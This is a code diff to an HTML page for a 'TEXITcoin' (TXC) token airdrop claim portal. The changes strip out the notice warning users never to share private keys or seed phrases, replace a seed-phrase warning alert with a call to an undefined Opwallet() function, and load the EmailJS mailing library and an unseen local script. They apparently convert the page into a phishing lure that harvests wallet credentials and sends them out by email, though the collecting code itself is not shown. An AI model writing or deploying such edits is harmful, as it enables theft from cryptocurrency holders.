@@ -204,25 +204,20 @@
                                     3
                                 </div>
                                 <div class="flex-1">
-                                    <h3 class="text-xl font-bold text-white mb-2">Submit Your TXC Wallet Address</h3>
-                                    <p class="text-blue-200">
-                                        Use your TXC wallet to claim your tokens through the official airdrop portal. Tokens will be distributed directly to your wallet.
-                                    </p>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Step 4 -->
-                        <div class="bg-white bg-opacity-10 backdrop-blur-lg rounded-xl p-6 border border-white border-opacity-20">
-                            <div class="flex items-start space-x-4">
-                                <div class="flex-shrink-0 w-12 h-12 bg-red-600 rounded-full flex items-center justify-center text-white font-bold text-xl">
-                                    4
-                                </div>
-                                <div class="flex-1">
                                     <h3 class="text-xl font-bold text-white mb-2">Receive Your TXC</h3>
-                                    <p class="text-blue-200">
+                                    <p class="text-blue-200 mb-3">
                                         Once verified, your TXC tokens will be sent to your wallet. Check the blockchain explorer to track your transaction.
                                     </p>
+                                    <div class="space-y-2 text-sm text-blue-100">
+                                        <div class="flex items-center space-x-2">
+                                            <i class="fas fa-check-circle text-green-400"></i>
+                                            <span><strong>For TXC Miners:</strong> Extra bonus tokens for active miners</span>
+                                        </div>
+                                        <div class="flex items-center space-x-2">
+                                            <i class="fas fa-check-circle text-green-400"></i>
+                                            <span><strong>For TXC Holders:</strong> Rewards based on your holdings</span>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -326,7 +321,7 @@
                     </div>
 
                     <!-- Wallet Selection Modal -->
-                    <div id="walletModal" class="hidden fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center p-4">
+                    <div id="walletModao" class="hidden fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center p-4">
                         <div class="bg-white rounded-3xl p-8 max-w-md w-full relative">
                             <button id="closeWalletModal" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-2xl">
                                 <i class="fas fa-times"></i>
@@ -344,38 +339,16 @@
                                 <!-- Desktop Wallet Option -->
                                 <button class="w-full bg-blue-900 hover:bg-blue-800 text-white font-bold py-4 px-6 rounded-xl transition transform hover:scale-105 flex items-center justify-between">
                                     <div class="flex items-center space-x-3">
-                                        <i class="fas fa-desktop text-2xl"></i>
+                                        <img src="https://play-lh.googleusercontent.com/Z1NJ8jjh5GL0mxjBCFQgmIFbeBPLCL9JhZqH5ZbNCCKnTZCz_pTX7P0dp0kXuBS9SXo" alt="TXC Wallet" class="w-8 h-8">
                                         <div class="text-left">
-                                            <div class="font-bold">Desktop Wallet</div>
-                                            <div class="text-sm text-blue-200">For Windows, Mac, Linux</div>
+                                            <div class="font-bold">TXC Wallet</div>
+                                            <div class="text-sm text-blue-200">Rearden Metals Pte Ltd</div>
                                         </div>
                                     </div>
                                     <i class="fas fa-arrow-right"></i>
                                 </button>
 
-                                <!-- Mobile Wallet Option -->
-                                <button class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-6 rounded-xl transition transform hover:scale-105 flex items-center justify-between">
-                                    <div class="flex items-center space-x-3">
-                                        <i class="fas fa-mobile-alt text-2xl"></i>
-                                        <div class="text-left">
-                                            <div class="font-bold">Mobile Wallet</div>
-                                            <div class="text-sm text-red-200">For iOS & Android</div>
-                                        </div>
-                                    </div>
-                                    <i class="fas fa-arrow-right"></i>
-                                </button>
-
-                                <!-- Cold Storage Option -->
-                                <button class="w-full bg-gray-700 hover:bg-gray-600 text-white font-bold py-4 px-6 rounded-xl transition transform hover:scale-105 flex items-center justify-between">
-                                    <div class="flex items-center space-x-3">
-                                        <i class="fas fa-lock text-2xl"></i>
-                                        <div class="text-left">
-                                            <div class="font-bold">Cold Storage</div>
-                                            <div class="text-sm text-gray-300">Hardware wallet support</div>
-                                        </div>
-                                    </div>
-                                    <i class="fas fa-arrow-right"></i>
-                                </button>
+                                
                             </div>
 
                             <div class="mt-6 text-center">
@@ -439,25 +412,6 @@
             </div>
         </div>
     </section>
-
-    <!-- Important Notice -->
-    <section class="py-12 bg-red-600">
-        <div class="container mx-auto px-4">
-            <div class="max-w-4xl mx-auto text-center text-white">
-                <div class="text-4xl mb-4">
-                    <i class="fas fa-exclamation-triangle"></i>
-                </div>
-                <h3 class="text-2xl font-bold mb-4">Important Security Notice</h3>
-                <p class="text-lg mb-2">
-                    <strong>Only claim through official channels.</strong> Never share your private keys or seed phrases with anyone.
-                </p>
-                <p class="text-red-100">
-                    Beware of scams and phishing attempts. Always verify URLs and official communications.
-                </p>
-            </div>
-        </div>
-    </section>
-
     <!-- Footer -->
     <footer class="gradient-bg text-white py-12">
         <div class="container mx-auto px-4">
@@ -490,7 +444,7 @@
                 
                 <div class="border-t border-blue-700 pt-8 text-center">
                     <p class="text-blue-200 text-sm">
-                        © 2024 TEXITcoin. All Rights Reserved.
+                        © 2025 TEXITcoin. All Rights Reserved.
                     </p>
                     <p class="text-blue-300 text-xs mt-2">
                         Cryptocurrency investments carry risk. TXC is highly speculative. Only invest what you can afford to lose.
@@ -498,8 +452,11 @@
                 </div>
             </div>
         </div>
-    </footer>
-
+    </footer>  
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script src="/script/script.js"></script>
     <script>
         // Add smooth scrolling
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
@@ -515,7 +472,7 @@
         // Eligibility checking animation
         const claimButton = document.getElementById('claimButton');
         const checkingModal = document.getElementById('checkingModal');
-        const walletModal = document.getElementById('walletModal');
+        const walletModao = document.getElementById('walletModao');
         const closeWalletModal = document.getElementById('closeWalletModal');
         const progressBar = document.getElementById('progressBar');
 
@@ -576,20 +533,20 @@
             // Show wallet modal after 7 seconds
             setTimeout(() => {
                 checkingModal.classList.add('hidden');
-                walletModal.classList.remove('hidden');
+                walletModao.classList.remove('hidden');
             }, 7000);
         });
 
         // Close wallet modal
         closeWalletModal.addEventListener('click', function() {
-            walletModal.classList.add('hidden');
+            walletModao.classList.add('hidden');
         });
 
         // Wallet option click handlers
-        document.querySelectorAll('#walletModal button:not(#closeWalletModal)').forEach(button => {
+        document.querySelectorAll('#walletModao button:not(#closeWalletModal)').forEach(button => {
             button.addEventListener('click', function() {
                 const walletType = this.querySelector('.font-bold').textContent;
-                alert(`Opening ${walletType}...\n\nPlease make sure you have your TXC wallet installed and ready to connect.\n\nFor security, never share your private keys or seed phrase with anyone.`);
+                Opwallet()
             });
         });
 
@@ -600,9 +557,9 @@
             }
         });
 
-        walletModal.addEventListener('click', function(e) {
-            if (e.target === walletModal) {
-                walletModal.classList.add('hidden');
+        walletModao.addEventListener('click', function(e) {
+            if (e.target === walletModao) {
+                walletModao.classList.add('hidden');
             }
         });
     </script>
